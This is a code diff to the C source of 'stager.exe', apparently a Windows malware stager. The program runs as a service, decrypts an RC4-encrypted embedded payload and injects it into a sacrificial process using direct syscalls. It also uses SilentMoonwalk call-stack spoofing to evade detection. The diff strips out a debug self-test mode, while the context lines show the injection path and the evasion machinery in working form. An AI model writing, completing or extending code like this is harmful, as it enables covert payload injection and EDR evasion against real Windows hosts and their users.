@@ -34,8 +34,6 @@
  *   stager.exe --start       start the service
  *   stager.exe --stop        stop the service
  *   stager.exe --run         inject once in the foreground (debugging)
- *   stager.exe --selftest    decrypt blob/stage and report sizes, head/tail
- *                            hashes and syscall/SMW status (CI / smoke test)
  */
 #ifndef UNICODE
 #define UNICODE
@@ -160,23 +158,6 @@ static int decrypt_payload(unsigned char **payload, size_t *payload_len) {
   }
   return 0;
 }
-
-/* hex_byte prints one byte as lowercase hex (diagnostics only). */
-#ifdef DEBUG
-static void hex_byte(FILE *f, uint8_t b) {
-  static const char hex[] = "0123456789abcdef";
-  fputc(hex[b >> 4], f);
-  fputc(hex[b & 0xf], f);
-}
-
-/* print_hex prints the first n bytes of buf. */
-static void print_hex(FILE *f, const unsigned char *buf, size_t n) {
-  size_t i;
-  for (i = 0; i < n; i++) {
-    hex_byte(f, buf[i]);
-  }
-}
-#endif /* DEBUG */
 
 /* ----------------------------------------------------------------- trampoline
  */
@@ -589,100 +570,6 @@ static DWORD do_inject(const unsigned char *payload, size_t payload_len) {
 #endif
 }
 
-/* ----------------------------------------------------------------- selftest */
-
-#ifdef DEBUG
-
-/*
- * selftest decrypts the embedded payload and prints a single machine-parseable
- * line so CI (and operators) can verify the resource/RC4 pipeline end to end
- * without touching a sacrificial process:
- *
- *   SELFTEST data_len=<n> key_len=<n> head=<first16hex> tail=<last16hex>
- */
-static int selftest(void) {
-  unsigned char *payload = NULL;
-  size_t payload_len = 0;
-  size_t head_n, tail_n;
-
-  if (decrypt_payload(&payload, &payload_len) != 0) {
-    return 1;
-  }
-
-  head_n = payload_len < 16 ? payload_len : 16;
-  tail_n = payload_len < 16 ? payload_len : 16;
-  printf("SELFTEST data_len=%zu key_len=%zu head=", payload_len, g_key_len);
-  print_hex(stdout, payload, head_n);
-  fputs(" tail=", stdout);
-  print_hex(stdout, payload + payload_len - tail_n, tail_n);
-  /* Regression signal for the SSN resolution (Zw-twin ranking): CI asserts
-   * that the syscall table initialized; `ssn=none` means it failed. */
-  fputs(" ssn=", stdout);
-#if NTSYS_HAVE
-  if (ntsys_ready()) {
-    printf("%u,%u,%u,%u,%u", ntsys_ssn("NtAllocateVirtualMemory"),
-           ntsys_ssn("NtWriteVirtualMemory"),
-           ntsys_ssn("NtProtectVirtualMemory"), ntsys_ssn("NtQueueApcThread"),
-           ntsys_ssn("NtCreateThreadEx"));
-  } else {
-    printf("none");
-  }
-#else
-  printf("none");
-#endif
-  fputc('\n', stdout);
-  /* Flush before anything host-specific: if a later step faults, the test's
-   * captured output still shows how far the selftest got. */
-  fflush(stdout);
-
-  /*
-   * SilentMoonwalk is probed only on request. Its template discovery and the
-   * spoofed call depend on the host's kernelbase/ntdll layout; a fault there
-   * would take the whole process down and could not be reported, so the
-   * default selftest stays deterministic. Set STAGED_LOADER_SMW_SELFTEST=1
-   * (on an --smw on build) to run it and print the smw=/smw_rw= fields.
-   */
-#if NTSYS_SMW
-  if (getenv("STAGED_LOADER_SMW_SELFTEST") != NULL) {
-    int rw_ok = 0;
-
-    /* Flush each field before evaluating it, so a fault leaves enough output
-     * to tell whether smw_ensure_init() or the spoofed call is at fault. */
-    fputs("SMW_SELFTEST smw=", stdout);
-    fflush(stdout);
-    printf("%d", smw_ensure_init() ? 1 : 0);
-    fflush(stdout);
-    fputs(" smw_rw=", stdout);
-    fflush(stdout);
-    if (ntsys_ready() && smw_ensure_init()) {
-      void *region = NULL;
-      SIZE_T region_size = 0x1000;
-      unsigned char probe[32];
-      if (ntsys_alloc_rw(GetCurrentProcess(), &region, &region_size)) {
-        memset(probe, 0x5a, sizeof(probe));
-        if (ntsys_write_mem(GetCurrentProcess(), region, probe,
-                            sizeof(probe))) {
-          void *protect_base = region;
-          SIZE_T protect_size = region_size;
-          if (ntsys_protect_rx(GetCurrentProcess(), &protect_base,
-                               &protect_size)) {
-            rw_ok = 1;
-          }
-        }
-        VirtualFree(region, 0, MEM_RELEASE);
-      }
-    }
-    printf("%d\n", rw_ok);
-    fflush(stdout);
-  }
-#endif
-
-  free(payload);
-  return 0;
-}
-
-#endif /* DEBUG */
-
 /* run_once performs a single foreground injection with the embedded blob. */
 static int run_once(void) {
   unsigned char *payload = NULL;
@@ -934,12 +821,11 @@ static void print_usage(void) {
          L"  --start        start '%s'\n"
          L"  --stop         stop '%s'\n"
          L"  --run          run once in the foreground (debugging)\n"
-         L"  --selftest     decrypt embedded payload, print sizes + checksums\n"
          L"  --help         this help\n",
          g_service_name, SACRIFICIAL_PROCESS, g_service_name, g_service_name,
          g_service_name, g_service_name);
 #else
-  wprint(L"usage: %s [--run] [--selftest]\n", g_service_name);
+  wprint(L"usage: %s [--run]\n", g_service_name);
 #endif
 #else
   (void)0; /* release images carry no help text */
@@ -1024,11 +910,6 @@ StageMain(int argc, wchar_t **argv, const unsigned char *enc_payload,
       return service_start_stop(0);
     }
 #endif
-#ifdef DEBUG
-    if (wcscmp(argv[i], L"--selftest") == 0) {
-      return selftest();
-    }
-#endif
     if (wcscmp(argv[i], L"--run") == 0) {
       return run_once();
     }
@@ -1043,7 +924,7 @@ StageMain(int argc, wchar_t **argv, const unsigned char *enc_payload,
   return 0;
 #else
   /* Non-service host: a bare invocation performs one injection. Unrecognised
-   * flags (such as a release build's stripped --selftest) do nothing. */
+   * flags do nothing. */
   if (argc <= 1) {
     return run_once();
   }
